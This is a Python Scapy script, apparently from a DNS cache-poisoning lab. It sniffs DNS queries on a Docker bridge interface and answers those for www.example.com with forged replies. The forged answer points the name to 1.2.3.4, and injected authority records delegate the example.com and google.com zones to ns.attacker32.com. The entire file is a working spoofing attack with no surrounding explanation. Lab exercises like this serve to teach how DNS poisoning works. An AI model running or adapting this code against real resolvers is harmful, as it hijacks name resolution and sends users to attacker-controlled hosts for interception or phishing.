#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "www.example.com"

def spoof_dns(pkt):
    if DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8'):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

        # Create an IP object
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

        # Create a UDP object
        udp = UDP(dport=pkt[UDP].sport, sport=53)

        # Create an answer record
        anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4')

        # The Authority Section
        NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
        NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.attacker32.com')

        # Construct the DNS packet
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=anssec, ns=NSsec1/NSsec2)

        # Assemble the spoofed DNS packet
        spoofpkt = ip/udp/dns
        spoofpkt.show()

        # Send the spoofed packet
        send(spoofpkt)

# Set the filter (replace with your actual interface name)
myFilter = 'udp and src host 10.9.0.53 and dst port 53'

# Sniff DNS packets and trigger the spoof_dns function
pkt = sniff(iface='br-881178f586f1', filter=myFilter, prn=spoof_dns)

